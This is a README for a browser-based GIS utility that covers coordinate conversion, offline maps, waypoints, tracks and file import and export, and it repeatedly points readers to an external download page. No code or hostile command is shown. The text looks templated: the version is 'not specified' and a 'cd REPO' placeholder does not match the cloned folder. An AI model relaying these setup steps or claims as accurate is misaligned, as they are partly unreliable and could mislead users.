# GOI GIS Tool - GIS Mapping Tool 2026

> **GOI GIS Tool is a browser-based GIS utility for converting coordinates, viewing maps offline, managing waypoints and tracks, and exchanging geospatial data.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexhillrhw933/goi-gis-coordinate-mapper?style=flat-square)](https://github.com/alexhillrhw933/goi-gis-coordinate-mapper)

---

<p align="center">
  <a href="https://alexhillrhw933.github.io/goi-gis-coordinate-mapper/">
    <img src="https://img.shields.io/badge/Download-GOI%20GIS%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download GOI GIS Tool">
  </a>
</p>

> **[Download GOI GIS Tool](https://alexhillrhw933.github.io/goi-gis-coordinate-mapper/)**

---

[Download Latest Build](https://alexhillrhw933.github.io/goi-gis-coordinate-mapper/)

---

## Overview

GOI GIS Tool is a self-contained web application for handling geographic coordinates, interactive maps, waypoints, tracks, and widely used geospatial file types. Coordinate conversion is available for DD, DDM, DMS, UTM, MGRS, Plus Codes, and several datums, supporting field preparation, navigation tasks, and everyday GIS reference work.

Built with an offline-first approach, the application provides full-screen maps, cached map regions, measurement features, and a selection of basemap and nautical chart layers. The entire tool is delivered in one HTML file, so it can be launched in a compatible browser without installation, compilation, or a build workflow.

---

## Capabilities

- Translate positions among DD, DDM, DMS, UTM, MGRS, Plus Codes, and supported datums.
- Work with a full-screen map designed for offline-first use.
- Build, modify, save, and export tracks.
- Create and arrange waypoints, then import, export, or position them on the map.
- Store map tiles for later access without a connection.
- Calculate distances, azimuths, polygon measurements, and areas.
- Load geometry from GPX, KML, and GeoJSON files.
- Produce GPX, KML, GeoJSON, CSV, or map image exports.
- Choose from multiple basemap and nautical chart layers.
- Use Italian, English, or French interface translations.
- Launch the tool directly from its standalone HTML file with no build steps.

---

## Getting Started

GOI GIS Tool is provided as a standalone HTML application.

### Download and launch

1. Visit the [latest build](https://alexhillrhw933.github.io/goi-gis-coordinate-mapper/).
2. Download the available HTML file.
3. Store it on the computer or device where you plan to use it.
4. Open the file with a modern web browser.

### Clone from the repository

```bash
git clone https://github.com/alexhillrhw933/goi-gis-coordinate-mapper.git
cd REPO
```

After cloning, open the main HTML file in a web browser. The standalone application does not need a package manager, compilation, or local web server.

---

## Using the Application

A common session may follow this sequence:

1. Launch the application in a web browser.
2. Pick a basemap or nautical chart layer.
3. Enter a coordinate and convert it to another supported system.
4. Add map waypoints manually or import them from a compatible file.
5. Draw or adjust a track, then inspect its distance or azimuth.
6. Use the measurement tools for routes, polygons, or areas.
7. Save or export the results as GPX, KML, GeoJSON, CSV, or a map image.
8. Cache the required map region for future offline use.

### Converting coordinates

Enter the position using one of the available coordinate formats, select the target format and datum, and then inspect or copy the converted value.

### Importing and exporting data

Existing geometry can be brought into the map from GPX, KML, or GeoJSON. Once waypoints or tracks have been updated, export them in the format needed by the next application or workflow.

---

## Settings and Stored Data

No separate configuration file or build environment is required. Options are controlled from within the application, including:

- Coordinate format and datum
- Basemap or nautical chart selection
- Interface language
- Cached map regions
- Waypoint and track information
- Measurement and display options

If you use the standalone HTML version, store exported files and locally saved map data somewhere convenient so they can be found later.

---

## Requirements

- A modern web browser with JavaScript enabled
- A desktop or mobile device that can render an interactive map
- Browser or local storage for cached areas and saved working data
- Internet connectivity for the initial application download and for loading online map layers
- Enough available storage for cached tiles and exported files

The application is supplied as HTML and requires no separate runtime, compiler, or installation procedure.

---

## Frequently Asked Questions

### Is an installation required?

No. Open the standalone HTML file in a compatible modern browser to run the application.

### Can the tool be used without an internet connection?

Yes, it is intended for offline-first mapping. Cache the required map regions in advance if you need tile access while offline.

### What coordinate systems and formats are available?

Supported options include DD, DDM, DMS, UTM, MGRS, Plus Codes, and multiple datums.

### What can be imported?

The map can import geometry from GPX, KML, and GeoJSON files.

### What can be exported?

Waypoints and tracks can be written to GPX, KML, GeoJSON, or CSV. Map images are also available as exports.

### How do I select another language?

Change the language through the application settings. Italian, English, and French are available.

### Why cannot I see map tiles while offline?

The required area must be cached before disconnecting, and the desired layer must be available during that process. Confirm the selected layer and cache the area again before leaving network coverage.

### Where can I report a problem or request support?

Submit the report through the repository's issue tracker at [https://github.com/alexhillrhw933/goi-gis-coordinate-mapper](https://github.com/alexhillrhw933/goi-gis-coordinate-mapper). Include your browser, operating environment, input format, and the steps that reproduce the issue.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
